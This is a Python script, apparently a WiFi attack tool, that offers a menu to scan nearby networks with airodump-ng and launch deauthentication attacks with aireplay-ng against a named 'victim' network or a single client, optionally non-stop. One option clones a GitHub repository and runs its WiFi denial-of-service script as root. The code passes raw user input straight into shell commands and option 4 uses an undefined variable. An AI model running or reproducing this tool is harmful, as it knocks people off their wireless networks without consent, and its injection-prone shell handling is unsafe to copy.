#Version 1.1

from colors import green, red, blue, yellow, purple, white

import os, time, sys

if os.geteuid() != 0:
    red()
    print('This scrips needs to ve executed with root privileges. Try "sudo python3 supremdeauther.py"')
    sys.exit(1)

white()

#<--Banner-->
white()
banner = """

:'######:'##::::'##'########:'########:'########'##::::'##:
'##... ##:##:::: ##:##.... ##:##.... ##:##.....::###::'###:
 ##:::..::##:::: ##:##:::: ##:##:::: ##:##:::::::####'####:
. ######::##:::: ##:########::########::######:::## ### ##:
:..... ##:##:::: ##:##.....:::##.. ##:::##...::::##. #: ##:
'##::: ##:##:::: ##:##::::::::##::. ##::##:::::::##:.:: ##:
. ######:. #######::##::::::::##:::. ##:########:##:::: ##:
:......:::.......::..::::::::..:::::..:........:..:::::..::                                               
                                                                                                                                       
"""

#<--Menu-->
def menu():
    green()
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Show Near WiFi")
    print("              |                    2 -->> Especific information of one WiFi")
    print("              |                    3 -->> Deauth Attack")
    print("              |                    4 -->> Especific Deauth Attack")
    print("              |                    5 -->> Alternative metod with python")
    print("              |                    6 -->> Restart Network")
    print("              |                    7 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        print("")
        red()
        wlan = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
        print("Copy the BBSID (and remember the channel) and hit ctrl+c to stop")
        time.sleep(5)
        white()
        print("")
        os.system("airmon-ng check kill")
        os.system("airmon-ng start "+wlan+"")
        os.system("airodump-ng "+wlan+"")
        red()
        cont = input("(Press enter to continue)")
        while True:
            menu()

    if x == "2":
        print("")
        red()
        print("")
        wlan2 = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
        white()
        print("")
        os.system("airmon-ng check kill")
        os.system("airmon-ng start "+wlan2+"")
        red()
        os.system("clear")
        wifitarget = input("Put the BSSID of the WiFi ----> ")
        print("")
        channel = input("Put the channel here ----> ")
        os.system("clear")
        print("Hit ctrl + c to stop")
        time.sleep(3)
        white()
        print("")
        os.system("airodump-ng --bssid "+wifitarget+" --channel "+channel+" "+wlan2+"")
        red()
        cont2 = input("(Press enter to continue)")
        while True:
            menu()

    if x == "3":
        print("")
        red()
        wlan3 = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
        white()
        print("")
        os.system("airmon-ng check kill")
        os.system("airmon-ng start "+wlan3+"")
        os.system("clear")
        red()
        bssid = input("Put the victim WiFi BSSID here ----> ")
        print("")
        duration = input("Duration of deauth attack (For non stop write 0) ----> ")
        print("")
        channel3 = input("Put the channel here ----> ")
        print("")
        print("Hit ctrl + c to stop")
        time.sleep(5)
        white()
        print("")
        os.system("airmon-ng start "+wlan3+" "+channel3+"")
        os.system("aireplay-ng --deauth "+duration+" -a "+bssid+" "+wlan3+"")
        red()
        cont3 = input("Done!(Press enter to continue)")
        while True:
            menu()

    if x == "4":
        print("")
        red()
        wlan4 = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
        white()
        print("")
        os.system("airmon-ng check kill")
        os.system("airmon-ng start "+wlan4+"")
        os.system("clear")
        red()
        bssid = input("Put the victim WiFi BSSID here ----> ")
        print("")
        target = input("Put the BSSID of the specific target inside the WiFi here ----> ")
        print("")
        duration = input("Duration of deauth attack (For non stop write 0) ---->")
        print("")
        channel4 = input("Put the channel here ----> ")
        print("")
        print("Hit ctrl + c to stop")
        time.sleep(5)
        white()
        print("")
        os.system("airmon-ng start "+wlan3+" "+channel4+"")
        os.system("aireplay-ng --deauth "+duration+" -a"+bssid+" -c "+target+" "+wlan4+"")
        red()
        cont4 = input("Done!(Press enter to continue)")
        while True:
            menu()

    if x == "5":
        print("")
        white()
        os.system("git clone https://github.com/davidbombal/red-python-scripts.git")
        os.system("clear")
        red()
        print("Credits to David Bombal: 'https://www.youtube.com/davidbombal'")
        time.sleep(5)
        white()
        print("")
        os.system("clear")
        os.system("sudo python3 red-python-scripts/wifi_dos3.py")
        os.system("clear")
        os.system("rm -rf backup/ file-01.csv red-python-scripts")
        red()
        cont5 = input("Done!(Press enter to continue)")
        while True:
            menu()

    if x == "6":
        print("")
        red()
        wlan6 = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
        white()
        print("")
        os.system("airmon-ng stop "+wlan6+"")
        os.system("systemctl restart NetworkManager.service")
        os.system("ifdown -a")
        os.system("ifup -a")
        red()
        cont6 = input("Done!(Press enter to continue)")
        while True:
            menu()
    
    if x == "7":
        os.system("rm -rf backup/ file-01.csv red-python-scripts")
        os.system("clear")
        restart = input("Do you want to restart your network? (y/n) ----> ")
        if restart == "y":
            print("")
            red()
            wlan6 = input("Name of your wifi adapter (Ex: wlan0) here ----> ")
            white()
            print("")
            os.system("airmon-ng stop "+wlan6+"")
            os.system("systemctl restart NetworkManager.service")
            os.system("ifdown -a")
            os.system("ifup -a")
            os.system("clear")
            blue()
            print("Goodbye :D")
            exit()
        if restart == "n":
            os.system("clear")
            blue()
            print("Goodbye :D")
            exit()
        


#<--Start Tool-->
menu()
